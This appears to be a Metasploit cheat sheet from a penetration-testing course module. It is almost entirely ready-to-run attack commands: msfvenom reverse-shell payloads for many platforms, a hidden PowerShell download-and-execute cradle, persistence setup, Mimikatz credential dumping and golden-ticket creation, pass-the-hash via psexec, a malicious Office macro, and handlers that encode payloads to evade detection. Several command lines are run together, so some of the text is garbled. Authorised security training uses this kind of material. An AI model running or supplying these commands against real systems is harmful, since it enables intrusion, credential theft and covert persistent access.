# Module 22 (Metasploit Framwork)

### Meterpreter - Basic <a href="#meterpreter-basic" id="meterpreter-basic"></a>

#### Generate a meterpreter <a href="#generate-a-meterpreter" id="generate-a-meterpreter"></a>

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f elf > shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f exe > shell.exe
msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f macho > shell.macho
msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.jsp 
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f war > shell.war
msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw > shell.sh msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > shell.pl
```

### Meterpreter Webdelivery <a href="#meterpreter-webdelivery" id="meterpreter-webdelivery"></a>

Set up a Powershell web delivery listening on port 8080.

{% code overflow="wrap" %}
```bash
use exploit/multi/script/web_deliveryset 
TARGET 2
set payload windows/x64/meterpreter/reverse_http 
set LHOST 10.0.0.1
set LPORT 4444
run
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://10.0.0.1:8080/rYDPPB');
```
{% endcode %}

### Persistence Startup <a href="#persistence-startup" id="persistence-startup"></a>

```bash
use exploit/windows/local/persistence
OR
OPTIONS:

-A        Automatically start a matching exploit/multi/handler to connect to the agent
-L <opt>  Location in target host to write payload to, if none %TEMP% will be used.
-P <opt>  Payload to use, default is windows/meterpreter/reverse_tcp.
-S        Automatically start the agent on boot as a service (with SYSTEM privileges)
-T <opt>  Alternate executable template to use
-U        Automatically start the agent when the User logs on
-X        Automatically start the agent when the system boots
-h        This help menu
-i <opt>  The interval in seconds between each connection attempt
-p <opt>  The port on which the system running Metasploit is listening
-r <opt>  The IP of the system running Metasploit listening for the connect back
meterpreter > run persistence -U -p 4242
```

### Network Monitoring <a href="#network-monitoring" id="network-monitoring"></a>

```bash
#list interfaces 
run packetrecorder -li 
# record interface n°1
run packetrecorder -i 1
```

### Port forward <a href="#portforward" id="portforward"></a>

```
portfwd add -l 7777 -r 172.17.0.2 -p 3006
```

#### Upload / Download <a href="#upload-download" id="upload-download"></a>

```
upload /path/in/hdd/payload.exe exploit.exedownload /path/in/victim
```

#### Execute from Memory <a href="#execute-from-memory" id="execute-from-memory"></a>

```bash
execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w
```

#### Mimikatz <a href="#mimikatz" id="mimikatz"></a>

```bash
load mimikatz
mimikatz_command -f version
mimikatz_command -f samdump::hashes
mimikatz_command -f sekurlsa::wdigest
mimikatz_command -f sekurlsa::searchPasswords
mimikatz_command -f sekurlsa::logonPasswords full
```

```
load kiwi
creds_all
golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
```

#### Pass the Hash - PSExec <a href="#pass-the-hash-psexec" id="pass-the-hash-psexec"></a>

```bash
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > exploit
```

#### Use SOCKS Proxy <a href="#use-socks-proxy" id="use-socks-proxy"></a>

```
setg Proxies socks4:127.0.0.1:1080
```

### Scripting Metasploit <a href="#scripting-metasploit" id="scripting-metasploit"></a>

Using a `.rc file`, write the commands to execute, then run `msfconsole -r ./file.rc`. Here is a simple example to script the deployment of a handler an create an Office doc with macro.

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 0.0.0.0set LPORT 4646
set ExitOnSession false
exploit -j -z
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.10.14.22
set LPORT 4646
exploit
```

### Multiple transports <a href="#multiple-transports" id="multiple-transports"></a>

```
msfvenom -p windows/meterpreter_reverse_tcp lhost=<host> lport=<port> sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe
```

Then, in AddTransports.ps1

```bash
Add-TcpTransport -lhost <host> -lport <port> -RetryWait 10 -RetryTotal 30
Add-WebTransport -Url http(s)://<host>:<port>/<luri> -RetryWait 10 -RetryTotal 30
```

### Automation

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.11.0.4
set LPORT 443
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
exploit -j -z
```

```bash
sudo msfconsole -r setup.rc
```

privEsc

```bash
post/multi/manage/shell_to_meterpreter
```
